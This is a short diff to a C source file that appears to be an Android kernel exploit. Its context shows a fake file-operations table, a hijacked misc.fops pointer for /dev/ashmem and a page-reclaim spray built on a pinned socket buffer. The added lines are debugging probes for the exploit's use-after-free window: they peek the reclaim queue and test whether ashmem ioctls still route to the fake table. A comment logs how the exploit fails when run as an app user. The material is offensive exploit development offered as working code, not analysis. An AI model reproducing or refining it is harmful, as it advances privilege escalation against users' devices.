@@ -1407,6 +1407,34 @@ int install_pipe_physrw(int fd) {
                      "nonce=%llx nr=%d skbrxq=%d base_events=%d\n",
                      elapsed, (unsigned long long)tbl_now, tv,
                      (unsigned long long)nn, nr, q, ev);
+          /* app-domain page-death probes (2026-10-22: dead at +5~7s in
+           * 2/2 app-uid rounds vs 25s+ alive in shell; dead dump reads
+           * fail with ENOTTY so the writer fingerprint is unreadable).
+           *   peek: MSG_PEEK the reclaim receive queue without consuming
+           *     -- rv>0 == our pinned skb's data is still there (page
+           *     alive => the failure is the cfgfs channel / f_op), EAGAIN
+           *     == the queue byte is not ours (skb gone => page freed).
+           *   fresh: a NEW /dev/ashmem open probes the misc fops pointer
+           *     state -- ENOTTY == misc.fops still routes to the fake
+           *     table (whose ioctl slot is zeroed), success == the
+           *     pointer was restored/replaced. */
+          char pk[8] = {0};
+          errno = 0;
+          ssize_t pk_rv = recv(reclaim_recv_fd(), pk, sizeof(pk),
+                               MSG_PEEK | MSG_DONTWAIT);
+          int pk_err = errno;
+          int tfd = open("/dev/ashmem", O_RDWR);
+          int tioctl = -1, terrno = 0;
+          if (tfd >= 0) {
+            errno = 0;
+            tioctl = ioctl(tfd, ASHMEM_SET_NAME, "");
+            terrno = errno;
+            close(tfd);
+          }
+          pr_warning("win dead probe: peek rv=%zd errno=%d b0=%02x | "
+                     "fresh ashmem fd=%d ioctl=%d errno=%d\n",
+                     pk_rv, pk_err, (unsigned)(unsigned char)pk[0], tfd,
+                     tioctl, terrno);
           /* pattern dump across object0 (fake_fops .. +0x200): all-zero
            * = page/mm memset, 0x50-fill = pipe child sendmsg capture,
            * mm-ish fields = live mm_struct alloc -- identifies the writer */
